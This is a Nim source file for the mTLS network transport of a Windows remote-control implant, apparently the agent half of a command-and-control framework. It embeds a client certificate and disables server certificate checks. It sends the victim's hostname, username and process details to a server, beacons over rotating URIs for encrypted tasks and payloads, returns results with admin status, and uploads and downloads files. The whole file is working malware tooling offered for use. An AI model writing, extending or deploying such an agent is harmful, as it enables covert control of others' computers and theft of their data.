## mTLS transport for Nim agent.
## Uses WinHTTP (same as HTTP) + client certificate loaded from PFX.
## The PFX (PKCS12) is compiled in as a base64 string via -d:AgentPFX=<b64>.
## At runtime, PFXImportCertStore loads it into a temporary in-memory store,
## and WINHTTP_OPTION_CLIENT_CERT_CONTEXT presents it on each TLS handshake.
import winim/lean, winim/inc/winhttp
import std/[json, base64, strutils]
import config, crypto

# Compile-time mTLS material (base64-encoded PFX, injected by server)
const AgentPFX* {.strdefine.} = ""

# ── CRYPT32 types and procs ───────────────────────────────────────────────────

type
  CryptDataBlob {.pure.} = object
    cbData: DWORD
    pbData: ptr byte

  CertContext {.pure.} = object
    dwCertEncodingType: DWORD
    pbCertEncoded:      ptr byte
    cbCertEncoded:      DWORD
    pCertInfo:          pointer
    hCertStore:         pointer

proc PFXImportCertStore(pPFX: ptr CryptDataBlob; szPassword: LPCWSTR;
                        dwFlags: DWORD): pointer          # returns HCERTSTORE
  {.stdcall, dynlib: "crypt32", importc.}

proc CertFindCertificateInStore(hCertStore: pointer; dwCertEncodingType: DWORD;
                                dwFindFlags, dwFindType: DWORD;
                                pvFindPara: pointer;
                                pPrevCertContext: ptr CertContext): ptr CertContext
  {.stdcall, dynlib: "crypt32", importc.}

proc CertFreeCertificateContext(pCertContext: ptr CertContext): WINBOOL
  {.stdcall, dynlib: "crypt32", importc.}

proc CertCloseStore(hCertStore: pointer; dwFlags: DWORD): WINBOOL
  {.stdcall, dynlib: "crypt32", importc.}

const
  X509_ASN_ENCODING   = 0x00000001.DWORD
  PKCS_7_ASN_ENCODING = 0x00010000.DWORD
  CERT_FIND_ANY       = 0.DWORD
  CRYPT_EXPORTABLE    = 0x00000001.DWORD

# ── WinHTTP helpers (same as HTTP transport) ──────────────────────────────────

proc getEnvStr(k, default: string): string =
  var buf = newWideCString(newString(512))
  let n = GetEnvironmentVariableW(newWideCString(k), buf, 512)
  if n == 0: return default
  $buf

proc exeName*(): string =
  var buf = newWideCString(newString(MAX_PATH))
  let n = GetModuleFileNameW(0, buf, MAX_PATH)
  if n == 0: return "agent.exe"
  let full = $buf
  let i = max(full.rfind('\\'), full.rfind('/'))
  if i < 0: full else: full[i+1..^1]

type
  AgentTransport* = object
    serverUrl*: string
    agentId*:   string
    aesKey*:    seq[byte]
    uriIdx:     int
    uriList:    seq[string]
    certCtx:    ptr CertContext  # loaded once, reused on every request

  TaskWire* = object
    id*:      int64
    typ*:     string
    args*:    string
    payload*: seq[byte]

# Load the PFX cert at startup; returns nil if AgentPFX is empty.
proc loadCert(): ptr CertContext =
  when AgentPFX == "": return nil
  let pfxDER = cast[seq[byte]](base64.decode(AgentPFX))
  if pfxDER.len == 0: return nil
  var blob = CryptDataBlob(cbData: DWORD(pfxDER.len),
                           pbData: cast[ptr byte](unsafeAddr pfxDER[0]))
  let hStore = PFXImportCertStore(addr blob, newWideCString(""), CRYPT_EXPORTABLE)
  if hStore == nil: return nil
  let ctx = CertFindCertificateInStore(hStore,
    X509_ASN_ENCODING or PKCS_7_ASN_ENCODING, 0, CERT_FIND_ANY, nil, nil)
  # Keep the store open while the ctx is alive; close it via the store handle
  # that is embedded in ctx.hCertStore by CertFindCertificateInStore.
  discard CertCloseStore(hStore, 0)  # the returned ctx holds its own store ref
  return ctx

proc winHttpDo(t: var AgentTransport; meth, path: string;
               body: seq[byte] = @[]): (int, seq[byte]) =
  let hSess = WinHttpOpen(newWideCString(UserAgent),
    WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0)
  if hSess == nil: return (0, @[])
  defer: discard WinHttpCloseHandle(hSess)
  var host = ""
  var port = INTERNET_PORT(443)
  var rest = t.serverUrl
  if rest.startsWith("https://"): rest = rest[8..^1]
  elif rest.startsWith("http://"):  rest = rest[7..^1]; port = INTERNET_PORT(80)
  let slash  = rest.find('/')
  host = if slash < 0: rest else: rest[0..<slash]
  if ':' in host:
    let p = host.rfind(':')
    port = INTERNET_PORT(parseInt(host[p+1..^1])); host = host[0..<p]
  let fullPath = if slash < 0: path else: rest[slash..^1] & path
  let hConn = WinHttpConnect(hSess, newWideCString(host), port, 0)
  if hConn == nil: return (0, @[])
  defer: discard WinHttpCloseHandle(hConn)
  let hReq = WinHttpOpenRequest(hConn, newWideCString(meth), newWideCString(fullPath),
    nil, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, DWORD(WINHTTP_FLAG_SECURE))
  if hReq == nil: return (0, @[])
  defer: discard WinHttpCloseHandle(hReq)
  # Ignore TLS errors (self-signed server cert)
  var secFlags = DWORD(SECURITY_FLAG_IGNORE_UNKNOWN_CA or
    SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE or SECURITY_FLAG_IGNORE_CERT_CN_INVALID or
    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID)
  discard WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, addr secFlags, DWORD(sizeof(secFlags)))
  # Present client certificate
  if t.certCtx != nil:
    discard WinHttpSetOption(hReq, WINHTTP_OPTION_CLIENT_CERT_CONTEXT,
      cast[LPVOID](t.certCtx), DWORD(sizeof(CertContext)))
  let bodyPtr: LPVOID = if body.len > 0: cast[LPVOID](unsafeAddr body[0]) else: nil
  if not WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
      bodyPtr, DWORD(body.len), DWORD(body.len), 0).bool: return (0, @[])
  if not WinHttpReceiveResponse(hReq, nil).bool: return (0, @[])
  var code: DWORD; var codeSize = DWORD(sizeof(code))
  discard WinHttpQueryHeaders(hReq, DWORD(WINHTTP_QUERY_STATUS_CODE or WINHTTP_QUERY_FLAG_NUMBER),
    WINHTTP_HEADER_NAME_BY_INDEX, addr code, addr codeSize, WINHTTP_NO_HEADER_INDEX)
  var resp: seq[byte]
  var buf = newSeq[byte](8192)
  var got: DWORD
  while true:
    if not WinHttpReadData(hReq, cast[LPVOID](addr buf[0]), DWORD(buf.len), addr got).bool: break
    if got == 0: break
    resp.add(buf[0..<int(got)])
  return (int(code), resp)

proc newTransport*(): AgentTransport =
  result.serverUrl = ServerUrl
  result.certCtx   = loadCert()
  if BeaconURIs != "":
    result.uriList = BeaconURIs.split(',')

proc register*(t: var AgentTransport): bool =
  let info = %*{
    "hostname":     getEnvStr("COMPUTERNAME", "UNKNOWN"),
    "username":     getEnvStr("USERNAME", "UNKNOWN"),
    "os":           "windows/amd64",
    "pid":          int(GetCurrentProcessId()),
    "transport":    "mtls",
    "sleep_sec":    SleepSec,
    "jitter_pct":   JitterPct,
    "process_name": exeName()
  }
  let (code, resp) = t.winHttpDo("POST", "/register", cast[seq[byte]]($info))
  if code != 200 or resp.len == 0: return false
  try:
    let j = parseJson(cast[string](resp))
    t.agentId = j["agent_id"].getStr()
    t.aesKey  = cast[seq[byte]](base64.decode(j["aes_key"].getStr()))
    return true
  except: return false

proc beacon*(t: var AgentTransport): seq[TaskWire] =
  var path = "/beacon/" & t.agentId
  if t.uriList.len > 0:
    path = t.uriList[t.uriIdx mod t.uriList.len] & "/" & t.agentId
    inc t.uriIdx
  let (code, resp) = t.winHttpDo("GET", path)
  if code == 204 or resp.len == 0 or code != 200: return @[]
  let plain = openGCM(t.aesKey, resp)
  if plain.len == 0: return @[]
  try:
    let j = parseJson(cast[string](plain))
    for tw in j["tasks"]:
      var task = TaskWire(id: tw["id"].getBiggestInt(),
        typ: tw["type"].getStr(), args: tw{"args"}.getStr(""))
      let pl = tw{"payload"}.getStr("")
      if pl.len > 0: task.payload = cast[seq[byte]](base64.decode(pl))
      result.add(task)
  except: discard

proc sendResultAdmin*(t: var AgentTransport; taskId: int64;
                      output, errStr: string; isAdmin: bool) =
  let plain = cast[seq[byte]]($(%*{
    "task_id": taskId, "output": output, "error": errStr, "is_admin": isAdmin}))
  discard t.winHttpDo("POST", "/result/" & t.agentId, sealGCM(t.aesKey, plain))

proc sendResult*(t: var AgentTransport; taskId: int64; output, errStr: string) =
  let plain = cast[seq[byte]]($(%*{"task_id": taskId, "output": output, "error": errStr}))
  discard t.winHttpDo("POST", "/result/" & t.agentId, sealGCM(t.aesKey, plain))

proc uploadFile*(t: var AgentTransport; taskId: int64;
                 filename: string; data: seq[byte]) =
  discard t.winHttpDo("POST", "/upload/" & t.agentId & "/" & filename,
                      sealGCM(t.aesKey, data))

proc downloadFile*(t: var AgentTransport; filename: string): seq[byte] =
  let (code, resp) = t.winHttpDo("GET", "/dl/" & t.agentId & "/" & filename)
  if code != 200 or resp.len == 0: return @[]
  openGCM(t.aesKey, resp)
